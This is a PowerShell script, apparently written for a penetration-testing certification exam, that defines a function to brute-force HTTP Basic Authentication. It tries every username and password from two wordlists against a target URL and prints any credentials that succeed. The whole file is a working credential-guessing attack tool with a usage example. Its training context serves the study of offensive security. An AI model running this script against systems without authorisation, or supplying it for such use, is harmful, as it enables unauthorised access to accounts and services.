function Brute-Force-Basic-Authentication{

<#

.SYNOPSIS
PowerShell script to brute force basic authentication.

.DESCRIPTION
The script is designed to Try list of usernames and list of passwords in Basic Authentication.

.PARAMETER IP
The IP used to connect to.
    
.PARAMETER Port
Default port is 80.

.PARAMETER Protocol
The protocol to be used.

.PARAMETER UserList
List of Usernames to use in Brute forcing.

.PARAMETER PasswordList
List of Passwords to use in Brute forcing.

.PARAMETER StopOnSuccess
Use this option to stop the brute force on first success attempt.

.PARAMETER Path
The page on the target to brute force to authenticate, ex: http:\\127.0.0.1:80\admin

.EXAMPLE
PS > Brute-Force-Basic-Authentication -IP 127.0.0.1 -UserList \wordlist\usernames.txt -PasswordList \wordlist\passwords.txt -Port 80 

.LINK

https://pfpt3223.wordpress.com/2018/12/28/assignment-1/

.NOTES
This script was created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam:
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/

Student ID: PSP-3223

Credits for :https://github.com/ahhh/PSSE/blob/master/Brute-Basic-Auth.ps1

#>

  [CmdletBinding()] Param(
  
    [Parameter(Mandatory = $true, ValueFromPipeline=$true)][String] $IP,
    
    [Parameter(Mandatory = $true) ][String]$UserList,
    
    [Parameter(Mandatory = $true) ][String]$PasswordList,
    
    [Parameter(Mandatory = $false)][String]$Port = "80",
    
    [Parameter(Mandatory = $false)][String]$StopOnSuccess = "True",
    
    [Parameter(Mandatory = $false)][String]$Protocol = "http",

    [Parameter(Mandatory = $false)][String]$Path = ""
  
  )
  
  #prepare the full URL and usernames with passwords
  $Full_URL = $Protocol + "://" + $IP + ":" + $Port + "/" + $Path
  $Usernames = Get-Content $UserList
  $Passwords = Get-Content $PasswordList
  
  #nested loops, first one go through usernames and the second try all password with selected username
  #Breaking loop: https://blogs.technet.microsoft.com/heyscriptingguy/2014/05/08/powershell-looping-advanced-break/
  :Usernames_loop foreach ($Username in $Usernames)
  {
    # Loops trying each passwords in the list
    foreach ($Password in $Passwords)
    {
      # Start a new web client
      $WebClient = New-Object Net.WebClient

      # Prepare Basic Authentication Credentials for web client
      $SecurePassword = ConvertTo-SecureString -AsPlainText -String $Password -Force
      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $SecurePassword
      $WebClient.Credentials = $Credential
      Try
      {
        # Prints the targeted website to brute force
        $Full_URL

        # Prints the credentials being tested
        $message = "Checking $Username : $Password"
        $message
        $content = $webClient.DownloadString($Full_URL)

        # Continues on to print succesfull credentials
        $success = $true
       
        #$success
        if ($success -eq $true)
        {
          # Prints succesfull authentication to highlight legit creds
          $message = "[*]Match found! $Username : $Password"
          $message
          $content
          if ($StopOnSuccess)
          {
            break Usernames_loop
          }
        }
      }
      catch
      {
        # Print error 
        $success = $false
        $message = $error[0].ToString()
        $message
      }
    }
  }
}
